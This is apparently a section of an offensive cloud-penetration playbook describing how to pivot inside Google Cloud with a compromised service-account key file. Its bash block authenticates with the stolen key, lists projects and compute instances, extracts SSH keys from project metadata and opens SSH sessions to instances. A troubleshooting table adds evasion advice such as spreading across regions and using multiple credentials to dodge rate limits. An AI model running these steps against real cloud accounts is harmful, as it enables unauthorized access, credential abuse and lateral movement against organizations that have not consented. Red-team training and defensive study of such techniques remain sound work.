# Example 3: GCP Service Account Compromise

**Scenario:** Pivot using compromised service account

```bash
# Authenticate with service account key
gcloud auth activate-service-account --key-file compromised-sa.json

# List accessible projects
gcloud projects list

# Enumerate compute instances
gcloud compute instances list --project target-project

# Check for SSH keys in metadata
gcloud compute project-info describe --project target-project | grep ssh

# SSH to instance
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Authentication failures | Verify credentials; check MFA; ensure correct tenant/project; try alternative auth methods |
| Permission denied | List current roles; try different resources; check resource policies; verify region |
| Metadata service blocked | Check IMDSv2 (AWS); verify instance role; check firewall for 169.254.169.254 |
| Rate limiting | Add delays; spread across regions; use multiple credentials; focus on high-value targets |

## References

- [Advanced Cloud Scripts](references/advanced-cloud-scripts.md) - Azure Automation runbooks, Function Apps enumeration, AWS data exfiltration, GCP advanced exploitation